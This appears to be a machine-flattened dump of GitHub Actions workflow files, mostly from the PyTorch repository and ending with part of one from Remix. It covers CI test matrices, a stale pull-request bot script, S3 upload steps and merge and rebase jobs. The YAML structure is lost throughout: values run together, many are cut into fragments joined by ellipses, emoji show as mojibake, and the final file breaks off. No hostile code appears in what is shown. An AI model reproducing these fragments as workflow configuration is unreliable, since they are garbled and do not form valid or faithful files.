name: E ... minatorpython- ... -check:name: r ... minator/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__s390.ymls390ciflow/s390/*- ciflow/s390/*linux-manylinux-2_28-py3-cpu-s390x-buildlinux-m ... x-buildlinux-manylinux-2_28-py3-cpu-s390xlinux-m ... u-s390xpytorch/manylinuxs390x-builder:cpu-s390xpytorch ... u-s390xbuild-e ... nywheellinux-m ... -build:name: s390/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__s390x-periodic.ymls390x-periodic- cron: ... d tests{ include: [
  { config: "default", shard: 1,  num_shards: 10, runner: "linux.s390x" },
  { config: "default", shard: 2,  num_shards: 10, runner: "linux.s390x" },
  { config: "default", shard: 3,  num_shards: 10, runner: "linux.s390x" },
  { config: "default", shard: 4,  num_shards: 10, runner: "linux.s390x" },
  { config: "default", shard: 5,  num_shards: 10, runner: "linux.s390x" },
  { config: "default", shard: 6,  num_shards: 10, runner: "linux.s390x" },
  { config: "default", shard: 7,  num_shards: 10, runner: "linux.s390x" },
  { config: "default", shard: 8,  num_shards: 10, runner: "linux.s390x" },
  { config: "default", shard: 9,  num_shards: 10, runner: "linux.s390x" },
  { config: "default", shard: 10, num_shards: 10, runner: "linux.s390x" },
]}
linux-manylinux-2_28-py3-cpu-s390x-testlinux-m ... 0x-test${{ needs.linux-manylinux-2_28-py3-cpu-s390x-build.outputs.test-matrix }}"yes"name: s390x-periodic/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__scorecards.ymlossf-scorecard32 16 * * 3'32 16 * * 3'cron: '32 16 * * 3'- cron: ...  * * 3'false && github.repository == 'pytorch/pytorch'false & ... ytorch'ossf/scorecard-action@865b4092859256271290c77adbd10a43f4779972ossf/sc ... 4779972github/codeql-action/upload-sarif@5f532563584d71fdef14ee64d17bafb34f751ce5github/ ... f751ce5name: ossf-scorecard/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__slow.ymlslowciflow/slow/*- ciflow/slow/*linux-focal-cuda12_6-py3_10-gcc11-sm86-buildlinux-f ... 6-buildlinux-focal-cuda12.6-py3.10-gcc11-sm86linux-f ... 11-sm86{ include: [
  { config: "slow", shard: 1, num_shards: 3, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "slow", shard: 2, num_shards: 3, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "slow", shard: 3, num_shards: 3, runner: "linux.g5.4xlarge.nvidia.gpu" },
]}
name: l ... 11-sm86linux-focal-cuda12_6-py3_10-gcc11-sm86-testlinux-f ... 86-test- linux ... 6-build${{ needs.linux-focal-cuda12_6-py3_10-gcc11-sm86-build.outputs.docker-image }}${{ needs.linux-focal-cuda12_6-py3_10-gcc11-sm86-build.outputs.test-matrix }}build-e ... 11-sm86{ include: [
  { config: "slow", shard: 1, num_shards: 2, runner: "linux.2xlarge" },
  { config: "slow", shard: 2, num_shards: 2, runner: "linux.2xlarge" },
]}
{ include: [
  { config: "slow", shard: 1, num_shards: 2, runner: "linux.rocm.gpu.2", owners: ["module:rocm"] },
  { config: "slow", shard: 2, num_shards: 2, runner: "linux.rocm.gpu.2", owners: ["module:rocm"] },
]}
{ include: [
  { config: "slow", shard: 1, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "slow", shard: 2, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
  { config: "slow", shard: 3, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.4xlarge" },
]}
name: slow/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__stale.ymlClose stale pull requestsClose s ... equests30 * * * *cron: 30 * * * *- cron: 30 * * * *// Do some dumb retries on requests.
const retries = 7;
const baseBackoff = 100;
const sleep = timeout => new Promise(resolve => setTimeout(resolve, timeout));
github.hook.wrap('request', async (request, options) => {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      return await request(options);
    } catch (err) {
      if (attempt < retries) {
        core.warning(`Request getting retried. Attempt: ${attempt}`);
        await sleep(baseBackoff * Math.pow(2, attempt));
        continue;
      }
      throw err;
    }
  }
});

const MAX_API_REQUESTS = 100;

// If a PRs not labeled stale, label them stale after no update for 60 days.
const STALE_LABEL_THRESHOLD_MS = 1000 * 60 * 60 * 24 * 60;
// For PRs already labeled stale, close after not update for 30 days.
const STALE_CLOSE_THRESHOLD_MS = 1000 * 60 * 60 * 24 * 30;

const STALE_MESSAGE =
  "Looks like this PR hasn't been updated in a while so we're going to go ahead and mark this as `Stale`. <br>" +
  "Feel free to remove the `Stale` label if you feel this was a mistake. <br>" +
  "If you are unable to remove the `Stale` label please contact a maintainer in order to do so. <br>" +
  "If you want the bot to never mark this PR stale again, add the `no-stale` label.<br>" +
  "`Stale` pull requests will automatically be closed after 30 days of inactivity.<br>";

let numAPIRequests = 0;
let numProcessed = 0;

async function processPull(pull) {
  core.info(`[${pull.number}] URL: ${pull.html_url}`);
  numProcessed += 1;
  const labels = pull.labels.map((label) => label.name);

  // Skip if certain labels are present.
  if (labels.includes("no-stale") || labels.includes("high priority")) {
    core.info(`[${pull.number}] Skipping because PR has an exempting label.`);
    return false;
  }

  // Check if the PR is stale, according to our configured thresholds.
  let staleThresholdMillis;
  if (labels.includes("Stale")) {
    core.info(`[${pull.number}] PR is labeled stale, checking whether we should close it.`);
    staleThresholdMillis = STALE_CLOSE_THRESHOLD_MS;
  } else {
    core.info(`[${pull.number}] Checking whether to label PR as stale.`);
    staleThresholdMillis = STALE_LABEL_THRESHOLD_MS;
  }

  const millisSinceLastUpdated =
    new Date().getTime() - new Date(pull.updated_at).getTime();

  if (millisSinceLastUpdated < staleThresholdMillis) {
    core.info(`[${pull.number}] Skipping because PR was updated recently`);
    return false;
  }

  // At this point, we know we should do something.
  // For PRs already labeled stale, close them.
  if (labels.includes("Stale")) {
    core.info(`[${pull.number}] Closing PR.`);
    numAPIRequests += 1;
    await github.rest.issues.update({
      owner: "pytorch",
      repo: "pytorch",
      issue_number: pull.number,
      state: "closed",
    });
  } else {
    // For PRs not labeled stale, label them stale.
    core.info(`[${pull.number}] Labeling PR as stale.`);

    numAPIRequests += 1;
    await github.rest.issues.createComment({
      owner: "pytorch",
      repo: "pytorch",
      issue_number: pull.number,
      body: STALE_MESSAGE,
    });

    numAPIRequests += 1;
    await github.rest.issues.addLabels({
      owner: "pytorch",
      repo: "pytorch",
      issue_number: pull.number,
      labels: ["Stale"],
    });
  }
}

for await (const response of github.paginate.iterator(
  github.rest.pulls.list,
  {
    owner: "pytorch",
    repo: "pytorch",
    state: "open",
    sort: "created",
    direction: "asc",
    per_page: 100,
  }
)) {
  numAPIRequests += 1;
  const pulls = response.data;
  // Awaiting in a loop is intentional here. We want to serialize execution so
  // that log groups are printed correctl
  for (const pull of pulls) {
    if (numAPIRequests > MAX_API_REQUESTS) {
      core.warning("Max API requests exceeded, exiting.");
      process.exit(0);
    }
    await core.group(`Processing PR #${pull.number}`, async () => {
      await processPull(pull);
    });
  }
}
core.info(`Processed ${numProcessed} PRs total.`);
- uses: ...  v7.0.1name: C ... equests/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__target-determination-indexer.ymlIndex PyTorch Tests for Target DeterminationIndex P ... ination'0 0 * * *'cron: '0 0 * * *'- cron: '0 0 * * *'index${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu"${{ ne ... ia.gpu"target-determinator-envtarget- ... tor-envpath: pytorchci-image:pytorch-linux-focal-cuda12.4-cudnn9-py3-gcc9docker- ... y3-gcc91ec50e0cfc0fadc3b6ceb146617e2119ab26eb341ec50e0 ... b26eb34Configure AWS credentialsConfigu ... entialsarn:aws:iam::308535385114:role/gha_target_determinator_s3_read_writename: C ... entialsDownload checkpointAWS_DEF ... -east-1# Do this outside of docker so I don't have to put env vars in
pip3 install awscli==1.29.40
cd codellama
mkdir "CodeLlama-7b-Python"
aws s3 cp \
  "s3://target-determinator-assets/CodeLlama-7b-Python" \
  "CodeLlama-7b-Python" \
  --recursive
name: D ... ckpointRun indexerbash -l {0}# detached container should get cleaned up by teardown_ec2_linux
container_name=$(docker run \
  "${GPU_FLAG:-}" \
  -e MAX_JOBS="$(nproc --ignore=2)" \
  -e AWS_DEFAULT_REGION \
  --env-file="/tmp/github_env_${GITHUB_RUN_ID}" \
  --security-opt seccomp=unconfined \
  --cap-add=SYS_PTRACE \
  --tty \
  --detach \
  --user jenkins \
  -v "${GITHUB_WORKSPACE}:/var/lib/jenkins/workspace" \
  -w /var/lib/jenkins/workspace \
  "${DOCKER_IMAGE}"
)
chmod +x pytorch/.github/scripts/td_llm_indexer.sh
docker exec -t "${container_name}" sh -c 'pytorch/.github/scripts/td_llm_indexer.sh'
name: Run indexerUpload to s3cd llm-target-determinator/assets

TIMESTAMP=$(date -Iseconds)
ZIP_NAME="indexer-files-${TIMESTAMP}.zip"

# Create a zipfile with all the generated indices
zip -r "${ZIP_NAME}" indexer-files

# Note that because the below 2 operations are not atomic, there will
# be a period of a few seconds between these where there is no index
# present in the latest/ folder. To account for this, the retriever
# should have some retry logic with backoff to ensure fetching the
# index doesn't fail.
# Move the old index into the archived/ folder
aws s3 mv \
  "s3://target-determinator-assets/indexes/latest" \
  "s3://target-determinator-assets/indexes/archived" \
  --recursive

# Move the new index into the latestl/ folder
aws s3 cp \
  "${ZIP_NAME}" \
  "s3://target-determinator-assets/indexes/latest/${ZIP_NAME}"
name: Upload to s3needs:  ... el-typename: I ... ination/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__target_determination.ymlDownload LLM Artifacts from S3Downloa ... from S3.additional_ci_files/llm_results.additi ... resultsname: D ... from S3Do TDtdGITHUB_REFunzip -o .additional_ci_files/llm_results/mappings.zip -d .additional_ci_files/llm_results || true
python3 -m pip install boto3==1.35.42
python3 tools/testing/do_target_determination_for_s3.py
name: Do TDUpload TD results to s3steps.td.outcome == 'success'steps.t ... uccess'td_resultstd_results.jsonname: td_resultsStore TD results on GHAStore T ...  on GHAname: t ... ts.jsonname: t ... ination/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__test-check-binary.ymlTest check_binary.github/workflows/test-check-binary.yml.github ... ary.yml.ci/pytorch/check_binary.sh.ci/pyt ... nary.sh.ci/pytorch//smoke_test/smoke_test.py.ci/pyt ... test.py- .gith ... ary.ymlcheck_binary_linux_cpucheck_b ... nux_cpuTest check_binary.sh for Linux CPUTest ch ... nux CPUpython:3.11skip-docker-build"skip-docker-build"pushd .ci/pytorch/
pip install --pre torch --index-url https://download.pytorch.org/whl/nightly/cpu
DESIRED_PYTHON=3.11 DESIRED_CUDA=cpu PACKAGE_TYPE=manywheel ./check_binary.sh
popd
docker- ... on:3.11check_binary_linux_cudacheck_b ... ux_cudaTest check_binary.sh for Linux CUDATest ch ... ux CUDApushd .ci/pytorch/
pip install --pre torch --index-url https://download.pytorch.org/whl/nightly/cu124
DESIRED_PYTHON=3.11 DESIRED_CUDA=cu124 PACKAGE_TYPE=manywheel ./check_binary.sh
popd
runner: ... dia.gpucheck_b ... ux_cpu:name: T ... _binary/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__test-h100.ymlLimited CI on H100.github/workflows/test-h100.yml.github ... 100.yml- .gith ... 100.yml0 4,10,16,22 * * *cron: 0 ... 6 hours- cron: ... 6 hoursciflow/h100/*- ciflow/h100/*linux-focal-cuda12_6-py3_10-gcc11-sm90-buildlinux-focal-cuda12.6-py3.10-gcc11-sm90linux-f ... 11-sm90"linux.12xlarge"{ include: [
  { config: "smoke", shard: 1, num_shards: 1, runner: "linux.aws.h100" },
]}
name: l ... 11-sm90linux-focal-cuda12_6-py3_10-gcc11-sm90-testlinux-f ... 90-test${{ needs.linux-focal-cuda12_6-py3_10-gcc11-sm90-build.outputs.docker-image }}${{ needs.linux-focal-cuda12_6-py3_10-gcc11-sm90-build.outputs.test-matrix }}build-e ... 11-sm90name: L ... on H100/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__torchbench.ymltorchbenchciflow/torchbench/*- ciflo ... bench/*linux-focal-cuda12_4-py3_10-gcc9-torchbench-build-gcpcuda12.4-py3.10-gcc9-sm80linux-focal-cuda12.4-py3.10-gcc9-sm80{ include: [
  { config: "torchbench_gcp_smoketest", shard: 1, num_shards: 1, runner: "linux.aws.a100" },
]}
linux-focal-cuda12_4-py3_10-gcc9-torchbench-test-gcp${{ needs.linux-focal-cuda12_4-py3_10-gcc9-torchbench-build-gcp.outputs.docker-image }}${{ needs.linux-focal-cuda12_4-py3_10-gcc9-torchbench-build-gcp.outputs.test-matrix }}name: torchbench/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__trunk.ymltrunk- ciflow/trunk/*libtorch-linux-focal-cuda12_6-py3_10-gcc11-debug-buildlibtorch-linux-focal-cuda12.6-py3.10-gcc11-debuglibtorc ... 1-debuglibtorch-linux-focal-cuda12.6-py3.10-gcc11libtorc ... 0-gcc11"linux.4xlarge"name: l ... 1-debuglinux-focal-cuda12_6-py3_10-gcc11-no-ops-buildlinux-focal-cuda12.6-py3.10-gcc11-no-opslinux-f ... -no-ops{ include: [
  { config: "default", shard: 1, num_shards: 3, runner: "macos-m1-stable" },
  { config: "default", shard: 2, num_shards: 3, runner: "macos-m1-stable" },
  { config: "default", shard: 3, num_shards: 3, runner: "macos-m1-stable" },
  { config: "mps", shard: 1, num_shards: 1, runner: "macos-m1-13" },
  { config: "mps", shard: 1, num_shards: 1, runner: "macos-m1-14" },
  { config: "mps", shard: 1, num_shards: 1, runner: "macos-m2-15" },
]}
macos-py3-arm64-test- macos ... 4-buildbuild-e ... 3-arm64name: m ... 3-arm64name: w ... cpu-py3win-vs2022-cpu-py3-testwin-vs2 ... y3-test./.github/workflows/_win-test.yml- win-v ... 3-build${{ needs.win-vs2022-cpu-py3-build.outputs.test-matrix }}win-vs2022-cuda12_6-py3-buildwin-vs2022-cuda12.6-py3win-vs2 ... 2.6-py3"12.6"build-e ... 2.6-py3name: w ... 2.6-py3${{ startsWith(github.event.ref, 'refs/tags/ciflow/trunk') }}${{ sta ... nk') }}{ include: [
  { config: "default", shard: 1, num_shards: 2, runner: "linux.rocm.gpu.2" },
  { config: "default", shard: 2, num_shards: 2, runner: "linux.rocm.gpu.2" },
  { config: "distributed", shard: 1, num_shards: 1, runner: "linux.rocm.gpu.4" },
]}
if: ${{ ... nk') }}test_nn test_torch test_cuda test_ops test_unary_ufuncs test_binary_ufuncs test_autograd inductor/test_torchinductor distributed/test_c10d_common distributed/test_c10d_nccl"test_n ... d_nccl"verify-cachebench-cpu-buildverify- ... u-build{ include: [
  { config: "verify_cachebench", shard: 1, num_shards: 1, runner: "${{ needs.get-label-type.outputs.label-type }}linux.2xlarge" },
]}
name: v ... u-buildverify-cachebench-cpu-testverify- ... pu-test- verif ... u-build${{ needs.verify-cachebench-cpu-build.outputs.docker-image }}${{ needs.verify-cachebench-cpu-build.outputs.test-matrix }}name: v ... pu-testname: trunk/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__trymerge.ymlValidate and merge PRValidat ... erge PRtry-merge[try-merge]types: [try-merge]do_mergetry_merge_pr_${{ github.event.client_payload.pr_num }}try_mer ... _num }}Merge PRFORCE${{ github.event.client_payload.force}}${{ git ... force}}REBASE${{ github.event.client_payload.rebase }}${{ git ... base }}IGNORE_CURRENT${{ github.event.client_payload.ignore_current }}${{ git ... rent }}DRCI_BOT_KEY${{ secrets.DRCI_BOT_KEY }}set -x
if [ -n "${REBASE}" ]; then
  # attempt to rebase, if it fails then comment on the PR that it failed
  if ! python3 .github/scripts/tryrebase.py "${PR_NUM}" --branch "${REBASE}"; then
    python3 .github/scripts/comment_on_pr.py "${PR_NUM}" "merge"
    exit 0
  fi
  git checkout main
  git fetch -p
  # give github some time between the push and start workflows so that Github's messages
  # on the PR appear in chronological order (timing issues can shuffle them around)
  sleep 60
fi
if [ -n "${FORCE}" ]; then
  if [ -n "${COMMENT_ID}" ]; then
    python3 .github/scripts/trymerge.py --force --comment-id "${COMMENT_ID}" "${PR_NUM}"
  else
    python3 .github/scripts/trymerge.py --force "${PR_NUM}"
  fi
elif [ -n "${IGNORE_CURRENT}" ]; then
  if [ -n "${COMMENT_ID}" ]; then
    python3 .github/scripts/trymerge.py --ignore-current --comment-id "${COMMENT_ID}" "${PR_NUM}"
  else
    python3 .github/scripts/trymerge.py --ignore-current "${PR_NUM}"
  fi
elif [ -n "${COMMENT_ID}" ]; then
  python3 .github/scripts/trymerge.py --comment-id "${COMMENT_ID}" "${PR_NUM}"
else
  python3 .github/scripts/trymerge.py "${PR_NUM}"
fi
name: Merge PRset -x
python3 .github/scripts/comment_on_pr.py "${PR_NUM}" "merge"
arn:aws:iam::308535385114:role/upload_to_ossci_raw_job_statusarn:aws ... _statusrole-to ... _statusUpload merge record to s3Upload  ... d to s3ossci-raw-job-statusmerges/${{ github.repository }}/${{ github.event.client_payload.pr_num }}/${{ github.event.client_payload.comment_id }}/${{ github.run_id }}merges/ ... n_id }}merge_record.jsons3-buck ... -statusname: U ... d to s3do_merge:try-merge-${{ github.event.client_payload.pr_num }}try-mer ... _num }}name: V ... erge PR/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__tryrebase.ymlRebase PRtry-rebase[try-rebase]types: [try-rebase]do_rebaseRebaseset -x
if [ -n "${BRANCH}" ]; then
  python3 .github/scripts/tryrebase.py "${PR_NUM}" --branch "${BRANCH}"
else
  python3 .github/scripts/tryrebase.py "${PR_NUM}"
fi
name: Rebaseset -ex
python3 .github/scripts/comment_on_pr.py "${PR_NUM}" "rebase"
runs-on ... u-24.04do_rebase:name: Rebase PR/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__unstable-periodic.ymlunstable-periodic45 0,4,8,12,16,20 * * *45 0,4, ... 0 * * *cron: 4 ... 0 * * *- cron: ... 0 * * *ciflow/unstable/*- ciflow/unstable/*introductionIntroduce PyTorch unstable (periodic) workflowIntrodu ... orkflowecho "PyTorch unstable workflow is used to host experimental or flaky jobs"
echo " that needs to be run periodically, but doesn't impact trunk as part"
echo " of the stable periodic workflows."
echo
echo "In addition, a new label called ciflow/unstable can be attached to the"
echo " PR to trigger this workflow. That can be done either manually or"
echo " automatically using PyTorch auto-label bot."
echo
echo "Once the jobs are deemed stable enough (% red signal < 5% and TTS < 3h),"
echo " they can graduate and move back to periodic."
name: I ... orkflowintroduction:name: u ... eriodic/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__unstable.ymlunstableIntroduce PyTorch unstable workflowecho "PyTorch unstable workflow is used to host experimental or flaky jobs"
echo " that needs to be run for every commit, but doesn't block PR merging"
echo " as part of the stable pull or trunk workflows."
echo
echo "In addition, a new label called ciflow/unstable can be attached to the"
echo " PR to trigger this workflow. That can be done either manually or"
echo " automatically using PyTorch auto-label bot."
echo
echo "Once the jobs are deemed stable enough (% red signal < 5% and TTS < 3h),"
echo " they can graduate and move back to pull or trunk."
name: unstable/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__update-viablestrict.ymlUpdate viable/strict17,47 * * * *cron: 17,47 * * * *- cron: ... * * * *do_update_viablestrictdo_upda ... estrict${{ (github.event_name == 'schedule') && 'mergebot' || '' }}pytorch/test-infra/.github/actions/update-viablestrict@mainpytorch ... ct@mainupdate_viablestrictstable-branchviable/strictrequires[\"pull\", \"trunk\", \"lint\", \"linux-binary\"]'[\"pul ... ary\"]'secret-bot-tokenclickhouse-url${{ secrets.CLICKHOUSE_URL }}clickhouse-username${{ secrets.CLICKHOUSE_VIABLESTRICT_USERNAME }}clickhouse-password${{ secrets.CLICKHOUSE_VIABLESTRICT_PASSWORD }}name: U ... /strictAuthenticate to AWS with OIDCAuthent ... th OIDCname: A ... th OIDCPrint shaLATEST_SHA${{ steps.update_viablestrict.outputs.latest_viable_sha }}${{ ste ... _sha }}PUSH_RESULT${{ steps.update_viablestrict.outputs.push_result }}TIME${{ steps.update_viablestrict.outputs.time }}LATEST_ ... _sha }}echo "${PUSH_RESULT}"
if [ "$PUSH_RESULT" = "Everything up-to-date" ]; then
  echo "No update pushed"
else
  echo "{\"sha\": \"${LATEST_SHA}\", \"repository\":\"pytorch/pytorch\", \"timestamp\": ${TIME}}" > "/tmp/${LATEST_SHA}.json"
  pip install awscli==1.29.40
  aws s3 cp "/tmp/${LATEST_SHA}.json" "s3://ossci-raw-job-status/stable_pushes/pytorch/pytorch/${LATEST_SHA}.json"
fi
name: Print sha- name: ... /strictdo_upda ... strict:/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__update_pytorch_labels.ymlUpdate PyTorch Labels in S3Update  ... s in S3group: 1update-labels-in-S3arn:aws:iam::308535385114:role/gha_workflow_update_pytorch_labelsarn:aws ... _labelsrole-to ... _labelsUpdate PyTorch labels list in S3Update  ... t in S3python3 -m pip install boto3==1.35.42
.github/scripts/export_pytorch_labels.py pytorch pytorch
name: U ... t in S3update-labels-in-S3:name: U ... s in S3/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__upload-test-stats-while-running.ymlUpload test stats while runningUpload  ... runningupload-test-stats-while-runningupload- ... runninggroup:  ... runningupload_test_stats_while_runningupload_ ... runningpython3 -m pip install requests==2.32.2 boto3==1.35.42
Upload test statspython3 -m tools.stats.upload_test_stats_running_jobs
name: U ... t statsupload_ ... unning:name: U ... running/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__upload-test-stats.ymlinductor-cu124mac-mps- pullworkflows:get_workflow_conclusionget_wor ... clusionconclusion${{ fromJson(steps.get_conclusion.outputs.data).conclusion }}${{ fro ... sion }}conclus ... sion }}Get workflow run conclusionGet wor ... clusionoctokit/request-action@05a2312de9f8207044c4c9e41fe19703986acc13octokit ... 86acc13get_conclusionGET /repos/${{ github.repository }}/actions/runs/${{ github.event.workflow_run.id }}/attempts/${{ github.event.workflow_run.run_attempt }}GET /re ... empt }}route:  ... empt }}name: G ... clusion- name: ... clusionupload-test-statsUpload test stats for ${{ github.event.workflow_run.id }}, attempt ${{ github.event.workflow_run.run_attempt }}Upload  ... empt }}Print workflow informationPrint w ... rmationTRIGGERING_WORKFLOW${{ toJSON(github.event.workflow_run) }}${{ toJ ... run) }}TRIGGER ... run) }}echo "${TRIGGERING_WORKFLOW}"echo "$ ... KFLOW}"Configure aws credentialsarn:aws:iam::308535385114:role/gha_workflow_upload-torch-test-statsarn:aws ... t-statsrole-to ... t-statsupload-s3WORKFLOW_ARTIFACTS_URLWORKFLO ... CTS_URL${{ github.event.workflow_run.artifacts_url }}${{ github.event.workflow_run.id }}${{ git ... n.id }}WORKFLOW_RUN_ATTEMPT${{ github.event.workflow_run.run_attempt }}REPO_FULLNAME${{ github.event.workflow_run.repository.full_name }}echo "${WORKFLOW_ARTIFACTS_URL}"

# Note that in the case of Linux and Windows, their artifacts have already been uploaded to S3, so there simply won't be
# anything on GitHub to upload. The command should return right away
python3 -m tools.stats.upload_artifacts --workflow-run-id "${WORKFLOW_RUN_ID}" --workflow-run-attempt "${WORKFLOW_RUN_ATTEMPT}" --repo "${REPO_FULLNAME}"
WORKFLOW_URL${{ github.event.workflow_run.html_url }}HEAD_REPOSITORY${{ github.event.workflow_run.head_repository.full_name }}${{ github.event.workflow_run.head_branch }}echo "${WORKFLOW_URL}"
python3 -m tools.stats.upload_test_stats --workflow-run-id "${WORKFLOW_RUN_ID}" --workflow-run-attempt "${WORKFLOW_RUN_ATTEMPT}" --head-branch "${HEAD_BRANCH}" --head-repository "${HEAD_REPOSITORY}"
python3 -m tools.stats.upload_sccache_stats --workflow-run-id "${WORKFLOW_RUN_ID}" --workflow-run-attempt "${WORKFLOW_RUN_ATTEMPT}"
Analyze disabled tests rerunAnalyze ... s rerun# Analyze the results from disable tests rerun and upload them to S3
python3 -m tools.stats.check_disabled_tests --workflow-run-id "${WORKFLOW_RUN_ID}" --workflow-run-attempt "${WORKFLOW_RUN_ATTEMPT}" --repo "${REPO_FULLNAME}"
name: A ... s rerunUpload gpt-fast benchmark results to s3steps.upload-s3.outcome && steps.upload-s3.outcome == 'success' && contains(github.event.workflow_run.name, 'inductor-micro-benchmark')steps.u ... hmark')WORKFLO ... n.id }}python3 -m tools.stats.upload_dynamo_perf_stats --workflow-run-id "${WORKFLOW_RUN_ID}" --workflow-run-attempt "${WORKFLOW_RUN_ATTEMPT}" --repo "${REPO_FULLNAME}" --head-branch "${HEAD_BRANCH}" --dynamodb-table torchci-oss-ci-benchmark --match-filename "^gpt_fast_benchmark"
needs:  ... clusioncheck-api-rate${{ always() && github.repository_owner == 'pytorch' }}${{ alw ... rch' }}Get our GITHUB_TOKEN API limit usageGet our ... t usagecurl -H "Accept: application/vnd.github.v3+json" -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/rate_limit
name: G ... t usage- name: ... t usageget_wor ... lusion:/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__upload-torch-dynamo-perf-stats.ymlUpload torch dynamo performance statsUpload  ... e statsinductor-perf-nightly-A10ginducto ... ly-A10g[induct ... y-h100]workflo ... y-h100]get-conclusion${{ fromJson(steps.get-conclusion.outputs.data).conclusion }}upload-perf-statsgithub.event.workflow_run.conclusion == 'success' || needs.get-conclusion.outputs.conclusion == 'success' || github.event.workflow_run.conclusion == 'failure' || needs.get-conclusion.outputs.conclusion == 'failure'github. ... ess' ||Upload dynamo performance stats for ${{ github.event.workflow_run.id }}, attempt ${{ github.event.workflow_run.run_attempt }}Upload torch dynamo performance stats to S3Upload  ... s to S3# Upload perf test reports from GHA to S3, which can now be downloaded
# on HUD
python3 -m tools.stats.upload_artifacts --workflow-run-id "${WORKFLOW_RUN_ID}" --workflow-run-attempt "${WORKFLOW_RUN_ATTEMPT}" --repo "${REPO_FULLNAME}"
name: U ... s to S3Upload torch dynamo performance stats to s3steps.upload-s3.outcome && steps.upload-s3.outcome == 'success'steps.u ... uccess'python3 -m tools.stats.upload_dynamo_perf_stats --workflow-run-id "${WORKFLOW_RUN_ID}" --workflow-run-attempt "${WORKFLOW_RUN_ATTEMPT}" --repo "${REPO_FULLNAME}" --head-branch "${HEAD_BRANCH}" --dynamodb-table torchci-dynamo-perf-stats --match-filename "^inductor_"
get-conclusion:/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__upload_test_stats_intermediate.ymlUpload test stats intermediateUpload  ... mediateworkflow_idworkflow_id of the runworkflo ... the rundescrip ... the runworkflow_id:intermediate_upload_test_statsinterme ... t_statsIntermediate upload test stats for ${{ inputs.workflow_id }}Interme ... w_id }}arn:aws:iam::308535385114:role/gha_upload_test_stats_intermediate_workflowarn:aws ... orkflowrole-to ... orkflow${{ inputs.workflow_id }}${{ inp ... w_id }}python3 -m tools.stats.upload_test_stats_intermediate \
  --workflow-run-id "${WORKFLOW_RUN_ID}"
name: I ... w_id }}interme ... _stats:name: U ... mediate/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__weekly.ymlweekly37 7 * * 1cron: 37 7 * * 1- cron: 37 7 * * 1update-xla-commit-hashupdate- ... it-hashxlatest-infra-refrepo-name: xlaname: u ... it-hashupdate-slow-testspip install requests==2.32.2 clickhouse-connect==0.8.14
Update slow test fileUpdate  ... st filePYTORCHBOT_TOKENUPDATEBOT_TOKENPYTORCH ... OKEN }}git config --global user.name "PyTorch UpdateBot"
git config --global user.email "pytorchupdatebot@users.noreply.github.com"
python tools/testing/update_slow_tests.py
name: U ... st fileupdate-commit-hash:name: weekly/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__xpu.ymlciflow/xpu/*- ciflow/xpu/*linux-jammy-xpu-2025_0-py3_9-buildlinux-jammy-xpu-2025.0-py3.9linux-j ... 0-py3.9linux-xpu-2025-0-buildlinux-x ... 0-buildci-image:pytorch-linux-jammy-xpu-2025.0-py3ci-imag ... 5.0-py3{ include: [
  { config: "default", shard: 1, num_shards: 6, runner: "linux.idc.xpu" },
  { config: "default", shard: 2, num_shards: 6, runner: "linux.idc.xpu" },
  { config: "default", shard: 3, num_shards: 6, runner: "linux.idc.xpu" },
  { config: "default", shard: 4, num_shards: 6, runner: "linux.idc.xpu" },
  { config: "default", shard: 5, num_shards: 6, runner: "linux.idc.xpu" },
  { config: "default", shard: 6, num_shards: 6, runner: "linux.idc.xpu" },
]}
sync-ta ... 0-buildname: l ... 0-py3.9linux-jammy-xpu-2025_1-py3_9-testlinux-j ... _9-test./.github/workflows/_xpu-test.yml${{ needs.linux-jammy-xpu-2025_1-py3_9-build.outputs.docker-image }}${{ needs.linux-jammy-xpu-2025_1-py3_9-build.outputs.test-matrix }}build-e ... 1-py3.9windows-xpu-2025_0-buildwindows ... 0-buildwin-vs2022-xpu-2025_0-py3win-vs2 ... 5_0-py3win-vs2022-xpu-py32025.0'2025.0'build-e ... xpu-py3windows-xpu-2025_1-buildwindows ... 1-buildwin-vs2022-xpu-2025_1-py3win-vs2 ... 5_1-py32025.1'2025.1'name: xpu/home/huawei/github-actions-security/.github/workflows/remix-run_remix__close-v2-issues.ymlðŸšª Close v2 Issues\u1f6aa\udeaa Close v2 Issuesprior_to_dateprior_to_date:github.repository == 'remix-run/remix'github. ... /remix'CI: "true"â¬‡ï¸ Checkout repo\u2b07\ufe0f Checkout reponame: \u2b07 ... ut repoðŸ“¦ Setup pnpm\u1f4e6\udce6 Setup pnpmname: \u1f4e6\udce6 Setup pnpmâŽ” Setup node\u2394 Setup node".nvmrc""pnpm"node-ve ... .nvmrc"name: \u2394 Setup nodeðŸ“¥ Install deps\u1f4e5\udce5 Install depspnpm install --frozen-lockfilepnpm in ... ockfilename: \ud83d ... ll depsðŸšª Close Issues\u1f6aa\udeaa Close Issuesnode ./scripts/close-v2-issues.mjs --date ${{ github.event.inputs.prior_to_date }}node ./ ... date }}name: \ud83d ...  